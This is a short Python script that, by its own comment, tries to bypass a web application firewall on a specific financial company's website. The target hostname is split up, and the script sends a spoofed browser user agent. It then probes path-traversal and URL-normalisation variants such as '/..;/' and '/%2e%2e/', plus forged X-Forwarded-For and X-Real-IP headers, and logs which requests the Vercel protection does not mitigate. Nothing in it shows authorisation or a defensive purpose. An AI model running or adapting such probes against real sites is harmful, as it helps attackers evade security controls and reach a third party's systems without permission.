import time
T = "https://www" + ".infinitycapital" + ".bh"
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
import requests
s = requests.Session()
s.headers.update({"User-Agent": UA, "Accept": "*/*"})

# WAF bypass attempts to reach the app
tests = [
    ("GET", "/%2e%2e/", {}),
    ("GET", "/./", {}),
    ("GET", "//", {}),
    ("GET", "/;/", {}),
    ("GET", "/..;/", {}),
    ("GET", "/api%2f", {}),
    ("GET", "/api/..;/", {}),
    ("GET", "/_next/image/", {}),
    ("POST", "/", {}),
    ("OPTIONS", "/", {}),
    ("GET", "/", {"headers": {"X-Forwarded-For": "8.8.8.8"}}),
    ("GET", "/", {"headers": {"X-Real-IP": "8.8.8.8"}}),
    ("GET", "/", {"headers": {"X-Forwarded-Proto": "https"}}),
    ("GET", "/", {"headers": {"Accept": "application/json"}}),
    ("GET", "/", {"headers": {"Accept-Encoding": "identity"}, "headers2": {}}),
]
def probe(name, method, path, **kw):
    url = T + path
    try:
        r = s.request(method, url, timeout=15, allow_redirects=False, headers=kw.get("headers"), **({k:v for k,v in kw.items() if k not in ("headers","headers2")}))
        mit = r.headers.get("x-vercel-mitigated", "-")
        print(f"{method:6} {path:22} -> {r.status_code} len={len(r.content)} mitigated={mit}")
    except Exception as e:
        print(f"{method:6} {path:22} -> EXC {e}")

for m,p,kw in tests:
    probe("", m, p, **kw)
